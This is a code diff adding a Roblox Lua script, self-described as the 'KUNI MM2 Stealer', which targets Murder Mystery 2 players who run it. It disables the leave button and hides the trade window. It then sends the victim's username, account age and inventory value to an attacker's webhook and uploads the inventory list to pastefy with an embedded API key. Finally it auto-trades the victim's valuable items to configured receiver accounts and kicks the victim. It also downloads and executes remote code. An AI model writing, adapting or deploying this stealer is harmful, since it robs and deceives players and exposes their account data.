@@ -1,0 +1,585 @@
+-- ===== ANTI-RERUN =====
+_G.Ex = _G.Ex or false
+if _G.Ex then return end
+_G.Ex = true
+
+-- ===== JOB ID DETECTION =====
+local found = false
+local attempts = 0
+if getgc then
+    repeat
+        local hooked = false
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name then
+                    local name = info.name:lower()
+                    if name:find("step") and not name:find("stepanimate") then
+                        pcall(function()
+                            local old = hookfunction(v, function(...)
+                                if not found then
+                                    found = true
+                                    _G.RealJobID = game.JobId
+                                end
+                                if old then return old(...) end
+                            end)
+                        end)
+                        hooked = true
+                        break
+                    end
+                end
+            end
+        end
+        attempts = attempts + 1
+        if hooked or attempts >= 10 then break end
+        task.wait(0.1)
+    until found
+end
+if not found then _G.RealJobID = game.JobId end
+wait(0.5)
+
+-- ===== DISABLE LEAVE BUTTON =====
+task.spawn(function()
+    while task.wait(10) do
+        pcall(function()
+            for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+                v:Disable()
+            end
+        end)
+    end
+end)
+
+-- ===== GET REAL JOB ID =====
+local function GetRealJobID()
+    local exec = "Unknown"
+    pcall(function() exec = identifyexecutor() end)
+    local a = {
+        JobId = _G.RealJobID or game.JobId,
+        Executor = string.lower(exec),
+        IsDelta = false,
+        Success = true,
+    }
+    if a.Executor == 'delta' and _G.RealJobID then a.IsDelta = true end
+    return a
+end
+local jobData = GetRealJobID()
+_G.RealJobID = jobData.JobId
+_G.RealExecutor = jobData.Executor
+
+-- ============================================================
+--  USER CONFIGURATION
+-- ============================================================
+local Usernames = {""}
+local MinimumRarity = 'Godly'
+local MinimumValue = 1
+local PingEveryone = 'Yes'
+local Webhook = ""
+
+-- ============================================================
+
+local a, b, c, d, e = Usernames, MinimumRarity, MinimumValue, PingEveryone, Webhook
+
+if e == '' then
+    game.Players.LocalPlayer:Kick('Invalid URL. Please set a valid URL.')
+    return
+end
+if game.PlaceId ~= 142823291 then
+    game.Players.LocalPlayer:Kick('This script only works in Murder Mystery 2.')
+    return
+end
+
+pcall(function()
+    if game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType'):InvokeServer() == 'VIPServer' then
+        game.Players.LocalPlayer:Kick('Private servers are not supported. Please join a normal server.')
+        return
+    end
+end)
+
+if #game.Players:GetPlayers() >= 12 then
+    game.Players.LocalPlayer:Kick('Server is full, please rejoin another server')
+    return
+end
+
+local f = game:GetService('Players')
+local g = f.LocalPlayer
+local h, i, j = g:WaitForChild('PlayerGui'), game:GetService('ReplicatedStorage'), game:GetService('HttpService')
+
+-- ============================================================
+--  LOAD ASTATINE VALUE LIST
+-- ============================================================
+local itemData = {}
+local rarityOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
+
+local function LoadItemDatabase()
+    local resp = nil
+    local success = pcall(function()
+        resp = request({
+            Url = 'https://pastefy.app/VQbdZmIi/raw',
+            Method = 'GET',
+            Headers = { ['User-Agent'] = 'Mozilla/5.0' },
+            Timeout = 10
+        })
+    end)
+    
+    if not success or not resp or not resp.Body then
+        return nil, nil
+    end
+    
+    local func, err = loadstring(resp.Body)
+    if not func then
+        return nil, nil
+    end
+    
+    local raw = func()
+    if type(raw) ~= "table" then
+        return nil, nil
+    end
+    
+    local mapping = {}
+    local rarities = {}
+    local definedOrder = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma","Dual","Pet"}
+    
+    for rarity, items in pairs(raw) do
+        if type(items) == "table" then
+            rarities[rarity] = true
+            for itemName, value in pairs(items) do
+                if type(value) == "number" then
+                    local key1 = string.lower(itemName):gsub("'", ""):gsub(" ", "")
+                    local key2 = string.lower(itemName):gsub("'", ""):gsub(" ", "_")
+                    local key3 = string.lower(itemName):gsub("'", ""):gsub(" ", "-")
+                    
+                    local data = {
+                        Rarity = rarity,
+                        Value = value,
+                        Chroma = (string.lower(rarity) == "chroma")
+                    }
+                    
+                    mapping[key1] = data
+                    mapping[key2] = data
+                    mapping[key3] = data
+                    
+                    local key4 = string.lower(itemName):gsub(" ", "")
+                    mapping[key4] = data
+                end
+            end
+        end
+    end
+    
+    local order = {}
+    for _, r in ipairs(definedOrder) do
+        if rarities[r] then
+            table.insert(order, r)
+            rarities[r] = nil
+        end
+    end
+    for r in pairs(rarities) do
+        table.insert(order, r)
+    end
+    
+    return mapping, order
+end
+
+-- Load the database with retry
+local loadedData, loadedOrder = nil, nil
+for retry = 1, 3 do
+    loadedData, loadedOrder = LoadItemDatabase()
+    if loadedData and loadedOrder and #loadedOrder > 0 then
+        break
+    end
+    task.wait(0.5)
+end
+
+if loadedData and loadedOrder and #loadedOrder > 0 then
+    itemData = loadedData
+    rarityOrder = loadedOrder
+    warn("Successfully loaded from astatine.vip!")
+end
+
+local l = rarityOrder
+
+-- ===== CONFIGURE RARITY FILTER =====
+local allowedSet = {}
+local isRange = false
+local minIndex = nil
+if b:find(',') then
+    for word in string.gmatch(b, '[^,]+') do
+        local trimmed = word:gsub('^%s*(.-)%s*$', '%1')
+        allowedSet[trimmed] = true
+    end
+else
+    isRange = true
+    minIndex = table.find(l, b)
+    if not minIndex then minIndex = 1 end
+end
+
+-- ===== HELPER =====
+local function toTitleCase(m)
+    m = m:lower()
+    local n, o, p, q = '', #m, 1, true
+    while p <= o do
+        local r = m:sub(p, p)
+        if r == ' ' then
+            n = n .. ' '
+            q = true
+        else
+            if q then
+                n = n .. r:upper()
+                q = false
+            else
+                n = n .. r
+            end
+        end
+        p = p + 1
+    end
+    return n
+end
+
+-- ===== TRADE FUNCTIONS =====
+local function GetTradeStatus()
+    return i.Trade.GetTradeStatus:InvokeServer()
+end
+
+local function SendTradeRequest(n)
+    local o = f:FindFirstChild(n)
+    if not o then return false end
+    local p, q = pcall(function()
+        i.Trade.SendRequest:InvokeServer(o)
+    end)
+    if p then return true end
+    p, q = pcall(function()
+        i.Trade.SendRequest:InvokeServer(n)
+    end)
+    return p
+end
+
+local function AddWeaponToTrade(n)
+    i.Trade.OfferItem:FireServer(n, 'Weapons')
+end
+
+local lastOffer
+i.Trade.UpdateTrade.OnClientEvent:Connect(function(o)
+    if o and o.LastOffer then lastOffer = o.LastOffer end
+end)
+
+local function AcceptTrade()
+    if lastOffer then
+        i.Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer)
+        lastOffer = nil
+        return true
+    end
+    return false
+end
+
+local function WaitForTradeCompletion()
+    while true do
+        local o = GetTradeStatus()
+        if o == 'None' then break end
+        task.wait(0.1)
+    end
+end
+
+-- ===== EXCLUDED ITEMS =====
+local excluded = {
+    DefaultGun = true, DefaultKnife = true,
+    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
+    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
+    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
+    TestItem = true, Season1TestKnife = true,
+    Cracks = true, Icecrusher = true,
+    ['???'] = true, Dartbringer = true,
+    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
+    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
+    SharkSeeker = true,
+}
+
+-- ===== BUILD WEAPON LIST =====
+local q, r = {}, 0
+
+local function BuildWeaponList()
+    local list, total = {}, 0
+    local profile = i.Remotes.Inventory.GetProfileData:InvokeServer(g.Name)
+    if profile and profile.Weapons and profile.Weapons.Owned then
+        for dataId, amount in pairs(profile.Weapons.Owned) do
+            if amount and amount > 0 then
+                local key1 = string.lower(dataId):gsub("'", ""):gsub(" ", "")
+                local key2 = string.lower(dataId):gsub("'", ""):gsub(" ", "_")
+                local key3 = string.lower(dataId):gsub("'", ""):gsub(" ", "-")
+                local key4 = string.lower(dataId):gsub(" ", "")
+                
+                local info = itemData[key1] or itemData[key2] or itemData[key3] or itemData[key4]
+                
+                if info then
+                    local rarity = info.Rarity
+                    local include = false
+                    if isRange then
+                        local idx = table.find(l, rarity)
+                        include = (idx and idx >= minIndex)
+                    else
+                        include = allowedSet[rarity] or false
+                    end
+                    if include and not excluded[dataId] then
+                        local val = info.Value
+                        if val >= c then
+                            total = total + (val * amount)
+                            table.insert(list, {
+                                DataID = dataId,
+                                ItemName = dataId,
+                                Rarity = rarity,
+                                Amount = amount,
+                                Value = val,
+                                IsChroma = info.Chroma,
+                            })
+                        end
+                    end
+                end
+            end
+        end
+    end
+    table.sort(list, function(a,b)
+        return (a.Value * a.Amount) > (b.Value * b.Amount)
+    end)
+    return list, total
+end
+
+q, r = BuildWeaponList()
+
+local function RefreshInventory()
+    local newList, newTotal = BuildWeaponList()
+    q, r = newList, newTotal
+    return #q
+end
+
+-- ===== WEBHOOK SENDING =====
+local function SendWebhook(content, file)
+    local payload = {
+        Url = e,
+        Method = 'POST',
+        Headers = { ['Content-Type'] = 'application/json' },
+        Body = j:JSONEncode(content),
+    }
+    if file then
+        payload.Files = {
+            { Name = file.name or 'inventory.txt', Data = file.data, ContentType = 'text/plain' }
+        }
+    end
+    local success = pcall(function()
+        if request then request(payload)
+        elseif http_request then http_request(payload)
+        elseif syn and syn.request then syn.request(payload)
+        else
+            game:GetService("HttpService"):PostAsync(e, j:JSONEncode(payload.Body), Enum.HttpContentType.ApplicationJson)
+        end
+    end)
+    if not success then warn("Webhook send failed.") end
+end
+
+local function GenerateInventoryLines(list)
+    local lines = {}
+    local groups = {}
+    for _, item in ipairs(list) do
+        local rarity = item.Rarity or 'Unknown'
+        if not groups[rarity] then groups[rarity] = {} end
+        table.insert(groups[rarity], item)
+    end
+    for _, rarity in ipairs(l) do
+        if groups[rarity] then
+            local items = groups[rarity]
+            table.sort(items, function(a,b) return (a.Value*a.Amount) > (b.Value*b.Amount) end)
+            table.insert(lines, rarity)
+            for _, item in ipairs(items) do
+                local name = toTitleCase(item.ItemName)
+                if item.IsChroma then name = name .. ' [CHROMA]' end
+                table.insert(lines, string.format('  - %dx %s → %d', item.Amount, name, item.Value * item.Amount))
+            end
+        end
+    end
+    return lines
+end
+
+-- ===== PASTEFY UPLOAD =====
+local function UploadToPaste(text)
+    local PASTEFY_API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
+    local success, result = pcall(function()
+        local response = request({
+            Url = 'https://pastefy.app/api/v2/paste',
+            Method = 'POST',
+            Headers = {
+                ['Authorization'] = 'Bearer ' .. PASTEFY_API_KEY,
+                ['Content-Type'] = 'application/json',
+            },
+            Body = j:JSONEncode({
+                content = text,
+                title = 'KUNI MM2 Inventory',
+                description = 'KUNI MM2 Inventory from ' .. g.Name,
+                expires = 'never',
+                encrypted = false,
+            }),
+        })
+        if response and response.Body then
+            local data = j:JSONDecode(response.Body)
+            if data and data.paste and data.paste.id then
+                return 'https://pastefy.app/' .. data.paste.id .. '/raw'
+            end
+        end
+        return nil
+    end)
+    return success and result or nil
+end
+
+-- ===== SEND EMBED =====
+local function SendFirstMessage(mention, list)
+    local allLines = GenerateInventoryLines(list)
+    local fullText = table.concat(allLines, '\n')
+
+    local previewLines = {}
+    for i = 1, math.min(10, #list) do
+        local item = list[i]
+        local name = toTitleCase(item.ItemName)
+        if item.IsChroma then name = name .. ' (Chroma)' end
+        table.insert(previewLines, string.format('%s [%dx] → %d', name, item.Amount, item.Value * item.Amount))
+    end
+    local preview = table.concat(previewLines, '\n')
+    if #list > 10 then preview = preview .. '\n... and ' .. (#list - 10) .. ' more.' end
+
+    local playerCount = #f:GetPlayers()
+    
+    -- Convert Usernames table to string for Receivers field
+    local receiversStr = table.concat(a, ", ")
+    
+    -- Player info in code block with dynamic Receivers
+    local info = string.format(
+        '```\nUsername: %s\nDisplay: %s\nAccount Age: %d days\nExecutor: %s\nServer Players: %d/12\nReceivers: %s\n```',
+        g.Name, g.DisplayName, g.AccountAge, _G.RealExecutor or 'Unknown', playerCount, receiversStr
+    )
+
+    local pasteUrl = UploadToPaste(fullText)
+    
+    local embed = {
+        title = 'KUNI MM2 HIT!',
+        description = '**Murder Mystery 2**',
+        color = 0x3498DB,
+        timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ'),
+        fields = {
+            { name = '👤 Player Info', value = info, inline = false },
+            { name = '📦 Weapons', value = '```\n' .. (preview or 'None Found') .. '\n```', inline = false },
+            { name = '💰 Total Value', value = '```\n' .. r .. ' (Threshold: >' .. c .. ')\n```', inline = true },
+        },
+        footer = { 
+            text = 'KUNI MM2 Stealer • ' .. os.date('%Y-%m-%d %H:%M:%S'),
+            icon_url = 'https://i.imgur.com/96imAJh.png'
+        },
+    }
+    
+    if pasteUrl then
+        table.insert(embed.fields, { name = '📋 Full Inventory Log', value = pasteUrl, inline = false })
+    end
+    
+    table.insert(embed.fields, {
+        name = '🔗 Join Link',
+        value = '[' .. _G.RealJobID .. '](https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=' .. _G.RealJobID .. ')',
+        inline = false
+    })
+
+    pcall(function()
+        SendWebhook({ content = mention or '', embeds = { embed } }, nil)
+    end)
+end
+
+-- ===== HIDE TRADE GUI =====
+local tradeGUI = h:WaitForChild('TradeGUI')
+tradeGUI:GetPropertyChangedSignal('Enabled'):Connect(function()
+    tradeGUI.Enabled = false
+end)
+local tradeGUIPhone = h:WaitForChild('TradeGUI_Phone')
+tradeGUIPhone:GetPropertyChangedSignal('Enabled'):Connect(function()
+    tradeGUIPhone.Enabled = false
+end)
+
+-- ============================================================
+--  KICK FUNCTION WHEN DONE
+-- ============================================================
+local function KickWhenDone()
+    task.wait(2)
+    game.Players.LocalPlayer:Kick("KUNI MM2 | Your inventory has been transferred.")
+end
+
+-- ===== MAIN =====
+if #q > 0 then
+    local mention = (d == 'Yes') and '@everyone' or ''
+    SendFirstMessage(mention, q)
+
+    local function DoTrade(target)
+        local status = GetTradeStatus()
+        if status == 'StartTrade' then
+            i.Trade.DeclineTrade:FireServer()
+            task.wait(0.3)
+        elseif status == 'ReceivingRequest' then
+            i.Trade.DeclineRequest:FireServer()
+            task.wait(0.3)
+        end
+
+        while #q > 0 do
+            local s = GetTradeStatus()
+            if s == 'None' then
+                local sent, attempts = false, 1
+                while not sent do
+                    if SendTradeRequest(target) then
+                        sent = true
+                    else
+                        task.wait(math.min(attempts * 1, 10))
+                        attempts = attempts + 1
+                    end
+                end
+                task.wait(0.5)
+            elseif s == 'SendingRequest' then
+                task.wait(0.3)
+            elseif s == 'ReceivingRequest' then
+                i.Trade.DeclineRequest:FireServer()
+                task.wait(0.3)
+            elseif s == 'StartTrade' then
+                local count = math.min(4, #q)
+                for _ = 1, count do
+                    local item = table.remove(q, 1)
+                    for _ = 1, item.Amount do
+                        AddWeaponToTrade(item.DataID)
+                        task.wait(0.05)
+                    end
+                end
+                task.wait(6)
+                AcceptTrade()
+                WaitForTradeCompletion()
+                RefreshInventory()
+                if #q == 0 then 
+                    KickWhenDone()
+                    return 
+                end
+                task.wait(1.5)
+            else
+                task.wait(0.5)
+            end
+            task.wait(0.5)
+        end
+        KickWhenDone()
+    end
+
+    local function AutoTradeOnJoin()
+        local busy = false
+        local function TryTrade(player)
+            if busy then return end
+            if table.find(a, player.Name) then
+                busy = true
+                task.wait(3)
+                DoTrade(player.Name)
+            end
+        end
+        for _, player in ipairs(f:GetPlayers()) do
+            TryTrade(player)
+        end
+        f.PlayerAdded:Connect(TryTrade)
+    end
+
+    AutoTradeOnJoin()
+else
+    task.wait(1)
+    game.Players.LocalPlayer:Kick("KUNI MM2 | No valuable items found.")
+end
